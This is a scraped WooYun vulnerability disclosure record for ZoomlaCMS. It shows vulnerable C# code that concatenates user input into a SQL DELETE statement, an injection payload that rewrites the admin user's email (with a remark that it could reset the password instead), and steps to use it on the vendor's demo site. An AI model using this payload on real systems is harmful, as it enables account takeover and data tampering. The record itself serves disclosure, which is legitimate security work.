{"id": 2262, "wybug_id": "wooyun-2014-060763", "wybug_title": "逐浪CMS  SQL Update/CMS2 V1.3 V1.4 V1.5、 CMS6.0均受影响", "wybug_corp": "逐浪CMS", "wybug_author": "Damo", "wybug_date": "2014-05-15 11:48", "wybug_open_date": "2014-08-10 11:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-20：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向公众公开  简要描述： 话说 上次提交直接给忽略 那只好拿官方Demo做测试  另外此洞在2008年就已经存在 详细说明：  此问题为UPdate类型文件/user/usershop/StockList.aspx  问题参数 Item问题代码如下\nprotected void Button3_Click(object sender, EventArgs e)\t{\t\tstring text = base.Request.Form[\"Item\"];\t\tif (!string.IsNullOrEmpty(text) && this.bll.delstock(text))------------------此处\t\t{\t\t\tbase.Response.Write(\"<script language=javascript>alert('批量删除成功!');location.href='StockManage.aspx';</script>\");\t\t\treturn;\t\t}\t\tbase.Response.Write(\"<script language=javascript>alert('批量删除失败!请选择您要删除的数据');location.href='StockManage.aspx';</script>\");\t}\tpublic bool delstock(string str){\tstring strSql = \"delete from ZL_UserStock where (id in (\" + str + \"))\";\treturn SqlHelper.ExecuteSql(strSql, null);}\n构造参数 \n0))update ZL_User set Email='wooyun' where username='admin'--   //修改用户email  YY此处可以更改为修改管理员密码\n过程 登陆后访问http://demo.zoomla.cn/user/usershop/stocklist.aspx?Stocktype=1&a=aaa&id=111firebug修改页面<table>内容图：\n\n内容如下：\n<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" style=\"margin: 0 auto;background-color: white;\" class=\"border\">      <tbody><tr align=\"center\" style=\"background:#FFBD59\">        <td width=\"5%\" class=\"title\"><input type=\"checkbox\" onclick=\"javascript:CheckAll(this);\" name=\"Checkall\" id=\"Checkall\"></td>        <td width=\"13%\" class=\"title\">单据类型</td>        <td width=\"20%\" class=\"title\">单据编号</td>        <td width=\"15%\" class=\"title\">            录入时间</td>        <td width=\"12%\" class=\"title\"> 录入者</td>        <td width=\"20%\" class=\"title\"> 备注</td>        <td width=\"15%\" class=\"title\"> 操作</td>      </tr>              <tr onmouseout=\"this.className='tdbg'\" onmouseover=\"this.className='tdbgmouseover'\" class=\"tdbg\">        <td height=\"22\" align=\"center\"><input type=\"checkbox\" value=\"3\" name=\"Item\"></td>        <td height=\"22\" align=\"center\">出库</td>        <td height=\"22\" align=\"center\">订单</td>        <td height=\"22\" align=\"center\">2014/5/14 21:54:09</td>        <td height=\"22\" align=\"center\">admin</td>        <td height=\"22\" align=\"center\">好家伙</td>        <td height=\"22\" align=\"center\"><a href=\"StockAdd.aspx?menu=edit&amp;id=3\">修改</a> <a onclick=\"return confirm('不可恢复性删除数据,你确定将该数据删除吗？');\" href=\"Stocklist.aspx?menu=del&amp;id=3\">删除</a></td>      </tr>              <tr onmouseout=\"this.className='tdbg'\" onmouseover=\"this.className='tdbgmouseover'\" class=\"tdbg\">        <td height=\"22\" align=\"center\"><input type=\"checkbox\" value=\"2\" name=\"Item\"></td>        <td height=\"22\" align=\"center\">出库</td>        <td height=\"22\" align=\"center\">订单</td>        <td height=\"22\" align=\"center\">2014/5/14 21:54:09</td>        <td height=\"22\" align=\"center\">admin</td>        <td height=\"22\" align=\"center\">好家伙</td>        <td height=\"22\" align=\"center\"><a href=\"StockAdd.aspx?menu=edit&amp;id=2\">修改</a> <a onclick=\"return confirm('不可恢复性删除数据,你确定将该数据删除吗？');\" href=\"Stocklist.aspx?menu=del&amp;id=2\">删除</a></td>      </tr>                <tr class=\"tdbg\">        <td height=\"22\" align=\"center\" class=\"tdbgleft\" colspan=\"10\">共 <span id=\"Allnum\">2</span> 条记录  <span id=\"Toppage\"><a href=\"?Stocktype=0&amp;Currentpage=0\">首页</a></span> <span class=\"aspNetDisabled\" id=\"Nextpage\"><a href=\"?Stocktype=0&amp;Currentpage=0\">上一页</a></span> <span class=\"aspNetDisabled\" id=\"Downpage\"><a href=\"?Stocktype=0&amp;Currentpage=1\">下一页</a></span> <span id=\"Endpage\"><a href=\"?Stocktype=0&amp;Currentpage=1\">尾页</a></span>  页次：<span id=\"Nowpage\">1</span>/<span id=\"PageSize\">1</span>页  <span id=\"pagess\">10</span>条记录/页  转到第<select id=\"DropDownList1\" onchange=\"javascript:setTimeout('__doPostBack(\\'DropDownList1\\',\\'\\')', 0)\" name=\"DropDownList1\">\t<option value=\"1\">1</option></select>页</td>      </tr>    </tbody></table>\n修改复选框中的value \n\n然后点击删除按钮即可   漏洞证明：  \n\n本地下载的 CMS2 V1.3 V1.4 V1.5、 CMS6.0均受影响另外 从最早的一个文件来看此洞在2008年就已经存在   修复方案：  找程序猿   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-10 11:50 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-15 12:01 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  哈哈我都是用官网和官方demo两个来测试。就给过1rank，呵呵呵呵呵    \n     2014-05-15 12:07 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  求不忽略 哈哈    \n     2014-05-15 12:08 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @wefgod 悲剧啊    \n     2014-05-15 12:34 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @xsser    @wefgod   出生的时候就带了一个悲催的命    \n     2014-05-15 12:34 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Damo @xsser 谢谢同情    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}